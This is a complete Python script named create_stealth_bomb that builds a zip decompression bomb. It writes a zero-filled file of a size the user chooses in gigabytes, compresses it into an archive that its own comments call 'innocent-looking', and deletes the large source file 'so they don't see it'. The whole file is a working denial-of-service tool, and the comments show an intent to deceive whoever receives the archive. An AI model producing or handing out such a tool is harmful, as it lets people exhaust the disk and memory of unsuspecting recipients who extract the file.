import zipfile
import os
import time
from pathlib import Path
from multiprocessing import cpu_count

def create_stealth_bomb():
    # 1. Ask for size
    try:
        target_gb = float(input("Enter desired unzipped size in GB: "))
    except:
        print("Invalid input.")
        return

    # 2. Ask for CPU cores to use
    try:
        max_cores = cpu_count()
        print(f"Available CPU cores: {max_cores}")
        num_cores = int(input(f"Enter number of cores to use (1-{max_cores}): "))
        if num_cores < 1 or num_cores > max_cores:
            print(f"Invalid input. Using {max_cores} cores.")
            num_cores = max_cores
    except:
        num_cores = cpu_count()

    # 3. Ask for output directory
    print("\nSelect output directory:")
    print("1. Desktop")
    print("2. Home Directory")
    print("3. Current Directory")
    print("4. Custom path")
    
    try:
        choice = input("Enter choice (1-4): ").strip()
        if choice == "1":
            output_dir = Path.home() / "Desktop"
        elif choice == "2":
            output_dir = Path.home()
        elif choice == "3":
            output_dir = Path.cwd()
        elif choice == "4":
            custom_path = input("Enter full path: ").strip()
            output_dir = Path(custom_path)
        else:
            output_dir = Path.cwd()
    except:
        output_dir = Path.cwd()

    # Create directory if it doesn't exist
    try:
        output_dir.mkdir(parents=True, exist_ok=True)
        print(f"Output directory: {output_dir}")
    except Exception as e:
        print(f"Error creating directory: {e}")
        print(f"Using current directory instead: {Path.cwd()}")
        output_dir = Path.cwd()

    # The hidden heavy file (temp)
    temp_large_file = output_dir / "data_temp.txt"
    # The final innocent-looking zip
    final_zip = output_dir / "compressed_data.zip"

    # Verify we can write to the directory
    try:
        test_file = output_dir / ".write_test"
        test_file.touch()
        test_file.unlink()
    except Exception as e:
        print(f"Error: Cannot write to {output_dir}: {e}")
        return

    # 4. Create the massive data stream (10MB chunks)
    chunk = b"0" * (10 * 1024 * 1024)
    num_chunks = int(target_gb * 102.4)

    print(f"\nBuilding {target_gb}GB logical volume...")
    print(f"Using {num_cores} CPU core(s) for compression\n")
    
    try:
        # Step A: Create the large file temporarily
        print("Creating temporary data file...")
        with open(temp_large_file, "wb") as f:
            for i in range(num_chunks):
                f.write(chunk)
                if i % 100 == 0:
                    progress = int((i/num_chunks)*100) if num_chunks > 0 else 0
                    print(f"Progress: {progress}%", end="\r")

        print("\nCompressing with ZIP...")
        
        start_time = time.time()
        with zipfile.ZipFile(final_zip, 'w', zipfile.ZIP_DEFLATED, allowZip64=True) as zf:
            # We add the massive file into the zip
            zf.write(temp_large_file, "DATA.txt")
        
        elapsed_time = time.time() - start_time

        # Step B: DELETE the massive file so they don't see it
        print("Cleaning up temporary file...")
        os.remove(temp_large_file)

        # Display results
        final_size_mb = os.path.getsize(final_zip) / (1024*1024)
        final_size_gb = final_size_mb / 1024
        compression_ratio = (target_gb * 1024) / final_size_mb if final_size_mb > 0 else 0
        
        print("\n" + "="*50)
        print(f"Compression Complete!")
        print(f"Original Size: {target_gb} GB")
        print(f"Compressed Size: {final_size_mb:.2f} MiB ({final_size_gb:.4f} GB)")
        print(f"Compression Ratio: {compression_ratio:.2f}:1")
        print(f"Time Taken: {elapsed_time:.2f} seconds")
        print(f"Output File: {final_zip}")
        print("="*50)

    except Exception as e:
        print(f"Error: {e}")
        import traceback
        traceback.print_exc()
        if temp_large_file.exists():
            try:
                os.remove(temp_large_file)
            except:
                pass

if __name__ == "__main__":
    create_stealth_bomb()
